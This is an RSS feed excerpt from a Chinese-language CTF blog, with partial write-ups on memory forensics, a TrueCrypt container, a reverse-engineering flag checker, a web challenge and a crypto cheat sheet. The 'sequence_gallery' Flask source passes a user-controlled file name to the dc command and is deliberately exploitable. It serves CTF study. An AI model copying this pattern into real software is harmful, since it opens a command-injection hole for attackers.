&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85ab6260 msdtc.exe &lt;span style="color:#ae81ff">1128&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">15&lt;/span> &lt;span style="color:#ae81ff">154&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:06 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85ac8b00 WmiPrvSE.exe &lt;span style="color:#ae81ff">232&lt;/span> &lt;span style="color:#ae81ff">624&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span> &lt;span style="color:#ae81ff">193&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:06 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x841f4470 SearchIndexer. &lt;span style="color:#ae81ff">2148&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">14&lt;/span> &lt;span style="color:#ae81ff">604&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:08 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85b2a030 VSSVC.exe &lt;span style="color:#ae81ff">2276&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span> &lt;span style="color:#ae81ff">118&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:11 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85b80cb8 SearchProtocol &lt;span style="color:#ae81ff">2372&lt;/span> &lt;span style="color:#ae81ff">2148&lt;/span> &lt;span style="color:#ae81ff">9&lt;/span> &lt;span style="color:#ae81ff">284&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:13 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85b855f8 SearchFilterHo &lt;span style="color:#ae81ff">2392&lt;/span> &lt;span style="color:#ae81ff">2148&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#ae81ff">104&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:13 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85b97d20 svchost.exe &lt;span style="color:#ae81ff">2480&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">15&lt;/span> &lt;span style="color:#ae81ff">232&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:15 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85bc5398 wmpnetwk.exe &lt;span style="color:#ae81ff">2632&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span> &lt;span style="color:#ae81ff">212&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:16 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85bba030 WmiPrvSE.exe &lt;span style="color:#ae81ff">2860&lt;/span> &lt;span style="color:#ae81ff">624&lt;/span> &lt;span style="color:#ae81ff">15&lt;/span> &lt;span style="color:#ae81ff">319&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:25 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85c53030 WmiApSrv.exe &lt;span style="color:#ae81ff">3004&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#ae81ff">112&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:30 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85c596c0 TrueCrypt.exe &lt;span style="color:#ae81ff">3196&lt;/span> &lt;span style="color:#ae81ff">1384&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">67&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:02:07 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x84d54d20 sppsvc.exe &lt;span style="color:#ae81ff">3736&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#ae81ff">154&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:03:05 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x84d567f0 svchost.exe &lt;span style="color:#ae81ff">3776&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">15&lt;/span> &lt;span style="color:#ae81ff">353&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:03:05 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x844fcd20 DumpIt.exe &lt;span style="color:#ae81ff">4072&lt;/span> &lt;span style="color:#ae81ff">1384&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">38&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:03:14 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x844ba6e0 conhost.exe &lt;span style="color:#ae81ff">4080&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">51&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:03:14 UTC+0000
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>重點：&lt;code>0x85c596c0 TrueCrypt.exe 3196 1384 2 67 1 0 2023-02-16 12:02:07 UTC+0000&lt;/code>
&lt;a href="https://zh.wikipedia.org/zh-tw/TrueCrypt">TrueCrypt - Wiki&lt;/a>
&lt;blockquote>
&lt;p>TrueCrypt是一款已停止開發的動態（On-the-fly）磁碟加密軟體，支援Windows、macOS和Linux作業系統。它可在單個檔案和磁碟分割區中建立加密區，也可以加密整個作業系統，解密後使用者即可像普通分割區一樣使用其中的檔案。TrueCrypt支援使用密碼、金鑰檔案作為解密憑據。&lt;/p></description></item><item><title>CrewCTF - Encrypt10n(Part 2)</title><link>https://bernie6401.github.io/docs/security/practice/crewctf/misc/crewctf---encrypt10npart-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/crewctf/misc/crewctf---encrypt10npart-2/</guid><description>&lt;h1 id="crewctf---encrypt10npart-2">
 CrewCTF - Encrypt10n(Part 2)
 &lt;a class="anchor" href="#crewctf---encrypt10npart-2">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://kenfavors.com/code/how-to-open-a-truecrypt-container-using-cryptsetup/">How To Open A TrueCrypt Container Using cryptsetup&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>&lt;code>$ sudo cryptsetup --type tcrypt open container-to-mount container-name&lt;/code>&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://blog.51cto.com/majesty/991565">什麽是塊設備，什麽是字符設備？有什麽區別？&lt;/a>&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題應該是沿用part 1得到的密碼進行解密&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>用&lt;code>cryptsetup&lt;/code>&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>先進行解密&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo cryptsetup --type tcrypt open flag flag_decrypt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Enter passphrase &lt;span style="color:#66d9ef">for&lt;/span> flag:
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>則輸出的結果就是一個container儲存在&lt;code>/dev/mapper&lt;/code>，可以看到它是一個block device&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ll /dev/mapper
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>total &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>drwxr-xr-x &lt;span style="color:#ae81ff">2&lt;/span> root root &lt;span style="color:#ae81ff">80&lt;/span> Jul &lt;span style="color:#ae81ff">12&lt;/span> 21:44 .
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>drwxr-xr-x &lt;span style="color:#ae81ff">11&lt;/span> root root &lt;span style="color:#ae81ff">3140&lt;/span> Jul &lt;span style="color:#ae81ff">12&lt;/span> 21:44 ..
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>crw------- &lt;span style="color:#ae81ff">1&lt;/span> root root 10, &lt;span style="color:#ae81ff">236&lt;/span> Jul &lt;span style="color:#ae81ff">11&lt;/span> 23:06 control
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>brw-rw---- &lt;span style="color:#ae81ff">1&lt;/span> root disk 252, &lt;span style="color:#ae81ff">3&lt;/span> Jul &lt;span style="color:#ae81ff">12&lt;/span> 21:44 flag_dec
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>再來就要把這個container掛起來，要掛起來才能讀取裡面的資料&lt;/p></description></item><item><title>CrewCTF - ez rev</title><link>https://bernie6401.github.io/docs/security/practice/crewctf/reverse/crewctf---ez-rev/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/crewctf/reverse/crewctf---ez-rev/</guid><description>&lt;h1 id="crewctf---ez-rev">
 CrewCTF - ez rev
 &lt;a class="anchor" href="#crewctf---ez-rev">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Fake Main Function&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> __noreturn &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> a1, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>a2, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>a3)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> i; &lt;span style="color:#75715e">// [rsp+Ch] [rbp-4h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;[+] Another flag checker...&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fgets(byte_4200E0, &lt;span style="color:#ae81ff">256&lt;/span>, stdin);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( byte_4200E0[strlen(byte_4200E0) &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> byte_4200E0[strlen(byte_4200E0) &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">73&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( byte_4200E0[i] &lt;span style="color:#f92672">!=&lt;/span> (byte_420060[i] &lt;span style="color:#f92672">^&lt;/span> &lt;span style="color:#ae81ff">0x70&lt;/span>) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_401220();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_401202();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>首先這一題真的太難了，超出我的守備範圍，所以我先寫一些當作紀錄，之後可以更快銜接繼續解&lt;/p>
&lt;ol>
&lt;li>
&lt;p>首先可以執行一下，如果是在Ubuntu 20.04(預設Libc版本是2.31)的版本和其他版本會有不一樣的output&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ldd --version
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ldd &lt;span style="color:#f92672">(&lt;/span>Ubuntu GLIBC 2.31-0ubuntu9.9&lt;span style="color:#f92672">)&lt;/span> 2.31
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Copyright &lt;span style="color:#f92672">(&lt;/span>C&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#ae81ff">2020&lt;/span> Free Software Foundation, Inc.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>This is free software; see the source &lt;span style="color:#66d9ef">for&lt;/span> copying conditions. There is NO
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>warranty; not even &lt;span style="color:#66d9ef">for&lt;/span> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Written by Roland McGrath and Ulrich Drepper.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ./a.out
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Another flag checker...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">123456&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>-&lt;span style="color:#f92672">]&lt;/span> No :&lt;span style="color:#f92672">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ldd --version
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ldd &lt;span style="color:#f92672">(&lt;/span>Ubuntu GLIBC 2.35-0ubuntu3&lt;span style="color:#f92672">)&lt;/span> 2.35
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Copyright &lt;span style="color:#f92672">(&lt;/span>C&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#ae81ff">2022&lt;/span> Free Software Foundation, Inc.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>This is free software; see the source &lt;span style="color:#66d9ef">for&lt;/span> copying conditions. There is NO
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>warranty; not even &lt;span style="color:#66d9ef">for&lt;/span> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Written by Roland McGrath and Ulrich Drepper.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>./a.out
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Another flag checker...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">123456&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>-&lt;span style="color:#f92672">]&lt;/span> Why you still here
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>這是因為他和這隻程式執行的過程有關係&lt;/p></description></item><item><title>CrewCTF - sequence_gallery</title><link>https://bernie6401.github.io/docs/security/practice/crewctf/web/crewctf---sequence_gallery/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/crewctf/web/crewctf---sequence_gallery/</guid><description>&lt;h1 id="crewctf---sequence_gallery">
 CrewCTF - sequence_gallery
 &lt;a class="anchor" href="#crewctf---sequence_gallery">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://lab.feifei.tw/practice/ci/l1.php">Command Injection&lt;/a>
&lt;a href="https://www.geeksforgeeks.org/dc-command-in-linux-with-examples/">dc command in Linux with examples&lt;/a>
&lt;a href="https://deepinout.com/linux-cmd/linux-numerical-computation-cmd/linux-cmd-dc.html">Linux dc命令&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>dc -h
Usage: dc [OPTION] [file &amp;hellip;]
-e, &amp;ndash;expression=EXPR evaluate expression
-f, &amp;ndash;file=FILE evaluate contents of file
-h, &amp;ndash;help display this help and exit
-V, &amp;ndash;version output version information and exit&lt;/p>
&lt;p>Email bug reports to: &lt;a href="mailto:bug-dc@gnu.org">bug-dc@gnu.org&lt;/a> .&lt;/p>&lt;/blockquote>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!" data-lang="python!">import os
import sqlite3
import subprocess

from flask import Flask, request, render_template

app = Flask(__name__)

@app.get(&amp;#39;/&amp;#39;)
def index():
	sequence = request.args.get(&amp;#39;sequence&amp;#39;, None)
	if sequence is None:
		return render_template(&amp;#39;index.html&amp;#39;)

	script_file = os.path.basename(sequence + &amp;#39;.dc&amp;#39;)
	if &amp;#39; &amp;#39; in script_file or &amp;#39;flag&amp;#39; in script_file:
		return &amp;#39;:(&amp;#39;

	proc = subprocess.run(
		[&amp;#39;dc&amp;#39;, script_file], 
		capture_output=True,
		text=True,
		timeout=1,
	)
	output = proc.stdout

	return render_template(&amp;#39;index.html&amp;#39;, output=output)

if __name__ == &amp;#39;__main__&amp;#39;:
	app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8080)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Crypto Cheat Sheet</title><link>https://bernie6401.github.io/docs/tools/ctf/crypto-cheat-sheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/ctf/crypto-cheat-sheet/</guid><description>&lt;h1 id="crypto-cheat-sheet">
 Crypto Cheat Sheet
 &lt;a class="anchor" href="#crypto-cheat-sheet">#&lt;/a>
&lt;/h1>
&lt;h2 id="online-tools---classic-crypto">
 Online Tools - Classic Crypto
 &lt;a class="anchor" href="#online-tools---classic-crypto">#&lt;/a>
&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Complex&lt;/th>
 &lt;th>Substitution Cipher&lt;/th>
 &lt;th>Vigenère Cipher&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>&lt;a href="https://gchq.github.io/CyberChef/">CyberChef&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://www.boxentriq.com/code-breaking/cryptogram">Substitution Cipher Solver Tool&lt;/a>&lt;/td>
 &lt;td>Known Key &lt;/br>Python - &lt;code>pycipher&lt;/code> library&lt;/br>&lt;a href="https://planetcalc.com/2468/">online - Vigenère cipher&lt;/a>&lt;/br>CAP4&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://quipqiup.com/">quipqiup&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>Unknown Key&lt;/br>&lt;a href="https://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx">Vigenère Cipher Codebreaker&lt;/a>&lt;/br>&lt;a href="https://www.guballa.de/vigenere-solver">Vigenere Solver&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="rsa相關攻擊">
 RSA相關攻擊
 &lt;a class="anchor" href="#rsa%e7%9b%b8%e9%97%9c%e6%94%bb%e6%93%8a">#&lt;/a>
&lt;/h2>
&lt;p>其實整裡的文章內容都差不多&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://www.anquanke.com/post/id/84632">【技術分享】CTF中RSA的常見攻擊方法&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_module_attack/">Mod相關攻擊&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://zhuanlan.zhihu.com/p/76228394">CTF RSA&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="coding-tools">
 Coding Tools
 &lt;a class="anchor" href="#coding-tools">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>大數運算: &lt;a href="https://blog.csdn.net/m0_52842062/article/details/117852175">gmpy2&lt;/a>/&lt;a href="https://cocalc.com/features/sage">sage math online - cocalc&lt;/a>/&lt;a href="https://sagecell.sagemath.org/">sage math online - sagecell&lt;/a>/&lt;a href="https://www.wolframalpha.com/">WolframAlpha&lt;/a>:這是一個線上的搜索引擎，但凡和數學相關的都能進行運算，使用解說可以看&lt;a href="https://youtu.be/9JD3EzbAjH4?si=fmL7rOXK0u__Mf3u">這裡&lt;/a>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ sudo apt install sagemath
# or
$ conda create --name sageenv sage=10.0 -c conda-forge -y # just only for wsl
---
# 想要在sage中安裝python library
$ sage -pip install {library name}
&lt;/code>&lt;/pre>:::spoiler To address Discrete Log Problem
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>p &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">117635180960139721127318189832610714114593440637486157582828661167364276581210599344857316369131977790468647533227778603367761815400416396281259234299247850289710613080530669849409358755399675041263469367135430665518150110493389671646158566214130516002949975036799297119111385228596853422400303735447298026283&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>q &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">163800729847029979711295941089800020300275211671661376396219775666688832353701752860857691086339595920419175562271802936423756228938551439950541873798393442729921516031775531740506399414675546114663346731428381174638773512946351966471041847661507898143967764453261943807056370639171597924004988320983393199599&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x8788542cefd7490c9282c06b8d24280d56c6706b996bdf580290cdf2cb90e45efd2ce185fc07d2b916c24b0512d38ca14de0ee608a9d6003f258859bbbed97dad15c1d07410a34fd55cd8305eb43418d38f1ca6e024725b97fd9da701a39c23fe55a13d43b4bf9a3d9ebb44d7fe67bd60beffc29ec27bb4baf05ec5b250bfa68360df0d1379c066297a7878e59d27e68cf6a0da90755450827623e54e4f3d9f280fef53c7620d58decfbd10dd64e9d1d5507b5460603c58f5be70c82e2a8e613d730a950caea4c4389c5fc0521f8207ead5fb26c04eb6d0486fd6fe8d015fdabbda00139b42163acc86ffb30c12988058c6247344c42b8f3cdc984c06f4276f8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>g &lt;span style="color:#f92672">=&lt;/span> Mod(&lt;span style="color:#ae81ff">3&lt;/span>,p)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>m &lt;span style="color:#f92672">=&lt;/span> discrete_log(c,g)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(hex(m))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>g2 &lt;span style="color:#f92672">=&lt;/span> Mod(&lt;span style="color:#ae81ff">3&lt;/span>,q)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>m2 &lt;span style="color:#f92672">=&lt;/span> discrete_log(c,g2)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(m2)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(hex(m2)[&lt;span style="color:#ae81ff">2&lt;/span>:])
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;li>Crypto常用library: pycryptodom
&lt;code>$ pip install pycryptodome&lt;/code>
:::spoiler pycryptodome generate PEM file
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; from Crypto.PublicKey import RSA
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; n &lt;span style="color:#f92672">=&lt;/span> 0xb4f98200f1309e8a486824051051ac80790f8e66dac4744e2ce5134fb432121f41c5471e3459d01e56e64befd2034c65eb300ebf0045342221bff206b6cdda7f3349c17b08563a576731f95a64e2f00af70b5cbb2f4f388d49ce82da76ca609a6ec1529f29b0fa0bedc5764b86472e2c5ac5198cedb6f5e1e8e0ca950ea11bc4cf5e5a0497db3ad96f5a745cf902d56be394a259068fe198bc9de8fe8d034a71013f46c2ac72451211eb1127286c19467eaf3a10049942d46b0f49f3c51c01c06a2f8c94416cc1aadaeb191de959f0241ce8f32575c848bd2f4f8f84dab46e2aa7ad45de1c6060fbbee9668f8e9cb6d366b8cd6ce99f78bbef145f2b7b7e5222f762ccb95f17b1538260c2ea45571061b0d873fbe60d61dd87aa4833ac71b802f2b91d30f38e30ae9da39fbd1c53e80496f511521285b3bb1da3dc79931463d278d1fe28a77880a9f2368029c4cefffebbbd6904f85291b3606d0b5ed3efd8c1ee14538dc051274665f4b0f55d6c6e12d2cb728ac15f7a6572b71a5bd6fa01bddb0af211091bff4c8ec7e93efae4654b2abae09e35be29afbfc3f4df8e4348c525b9d8662a1ac344dadb15b953905f639b48fec7cfcfdf27cc0ad82b936d5efe7c0d891bf9752d3fb0857d38337df033e4b681d19ec8603535504d05a421036c077694482eee919a44b3296e2a4c272cbf7bbf14b6d62eb194e4ee83ba227fed
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; e &lt;span style="color:#f92672">=&lt;/span> 0x10001
